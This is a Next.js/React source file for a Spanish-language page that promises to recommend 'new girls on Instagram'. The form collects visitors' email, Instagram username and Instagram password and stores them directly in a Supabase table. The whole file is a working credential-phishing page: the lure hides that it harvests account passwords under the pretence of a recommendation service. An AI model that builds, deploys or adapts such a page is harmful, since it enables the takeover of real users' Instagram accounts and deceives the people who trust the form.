import { useState } from "react";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export default function Home() {
  const [form, setForm] = useState({ email: "", ig_username: "", password: "" });
  const [status, setStatus] = useState({ type: "", msg: "" });

  const handleChange = (e) => {
    setForm((f) => ({ ...f, [e.target.name]: e.target.value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus({ type: "", msg: "" });

    const { error } = await supabase.from("ign").insert([form]);
    if (error) {
      setStatus({ type: "error", msg: "No se pudo guardar. Intenta de nuevo." });
    } else {
      setStatus({ type: "ok", msg: "¡Listo! Te enviaremos recomendaciones." });
      setForm({ email: "", ig_username: "", password: "" });
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
      <div className="w-full max-w-md bg-black rounded-2xl shadow p-6">
        <h1 className="text-2xl font-bold text-center mb-2">
          ¿Quieres descubrir nuevas chicas en Instagram?
        </h1>
        <p className="text-center text-white-600 mb-6">
          Completa tus datos para enviarte recomendaciones personalizadas.
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium mb-1">Correo electrónico</label>
            <input
              type="email"
              name="email"
              value={form.email}
              onChange={handleChange}
              required
              className="w-full border rounded-lg px-3 py-2 focus:outline-none focus:ring"
              placeholder="tu@correo.com"
            />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Usuario de Instagram</label>
            <input
              type="text"
              name="ig_username"
              value={form.ig_username}
              onChange={handleChange}
              required
              className="w-full border rounded-lg px-3 py-2 focus:outline-none focus:ring"
              placeholder="tu_usuario"
            />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Contraseña de Instagram</label>
            <input
              type="password"
              name="password"
              value={form.password}
              onChange={handleChange}
              required
              className="w-full border rounded-lg px-3 py-2 focus:outline-none focus:ring"
              placeholder="********"
            />
          </div>

          <button
            type="submit"
            className="w-full py-2 rounded-xl bg-blue-600 text-white font-semibold hover:bg-blue-700 transition"
          >
            Recibir recomendaciones
          </button>
        </form>

        {status.msg && (
          <p
            className={`mt-4 text-center ${
              status.type === "ok" ? "text-green-700" : "text-red-700"
            }`}
          >
            {status.msg}
          </p>
        )}

        <div className="mt-6 text-xs text-gray-500 text-center">
          Al continuar, aceptas recibir correo ocasional con recomendaciones.
        </div>
      </div>
    </div>
  );
}
